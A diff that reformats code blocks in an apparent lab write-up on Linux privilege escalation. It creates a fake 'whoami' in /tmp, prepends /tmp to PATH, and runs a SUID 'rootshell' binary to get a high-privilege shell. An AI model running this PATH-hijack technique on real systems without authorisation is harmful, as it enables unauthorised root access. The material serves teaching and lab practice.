@@ -69,23 +69,24 @@ In simple words the rootshell program give a high privilege shell if the output 
 
 You can easily take advantage of this configuration by abusing the PATH system. Here, we built a file as “whoami” in the / tmp directory, and write the following bash code to print “tom”
 
-``
-cd /tmp
-echo "printf "tom"" > whoami
-chmod 777 whoami
-``
+``cd /tmp``
+
+``echo "printf "tom"" > whoami``
+
+``chmod 777 whoami``
+
 
 Add a temporary path variable with the help of the following command. you will observe that we had added /tmp as PATH variable.
 
-``
-export PATH=/tmp:$PATH
-echo path
-``
+
+``export PATH=/tmp:$PATH``
+
+``echo path``
+
 Execute the rootshell
 
 ``
-cd /home/tom
-./rootshell
+cd /home/tom;./rootshell
 ``
 
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/678f3e03-2613-4d6b-af49-848ee6964bc6)
